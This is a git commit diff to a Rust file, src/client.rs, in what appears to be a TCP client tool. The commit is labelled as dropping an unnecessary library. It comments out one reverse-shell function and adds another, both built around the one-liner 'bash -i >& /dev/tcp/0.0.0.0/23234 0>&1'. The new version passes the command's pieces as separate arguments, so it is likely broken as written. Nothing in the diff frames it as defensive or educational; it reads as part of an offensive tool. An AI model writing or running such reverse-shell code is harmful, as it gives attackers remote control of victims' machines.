5d9e3480556af5492b01258a957ec4082780b611
Christian Mierau <christian.mierau@freenet.de>
2023-03-14 11:55:28 +0100

    Dont Use a unnecessary Libary

--- src/client.rs
+++ src/client.rs
@@ -1,6 +1,6 @@
-
 use std::io::{BufRead, BufReader, Error, ErrorKind};
 use std::net::TcpStream;
+use std::process::{Command, ExitStatus};
 use std::str::from_utf8;
 
 
@@ -20,10 +20,24 @@ pub fn reader(stream: &TcpStream) -> Result<String, Error> {
     Ok(output.to_string())
 }
 
+/* 
 pub fn rscl() -> Result<String, Error> {
+    
     match shell_command::run_shell_command("bash -c 'bash -i >& /dev/tcp/0.0.0.0/23234 0>&1'") {
         Ok(output) => Ok(output),
         Err(_) => Err(Error::new(ErrorKind::Other, "Failed to run shell command"))
     }
+
     
+}*/
+
+pub fn rscl() -> Result<ExitStatus, Error> {
+    // bash -c 'bash -i >& /dev/tcp/0.0.0.0/23234 0>&1'
+    Command::new("bash")
+        .arg("-c")
+        .arg("'bash")
+        .arg("-i")
+        .arg(">&")
+        .arg("/dev/tcp/0.0.0.0/23234 0>&1'")
+        .status()
 }
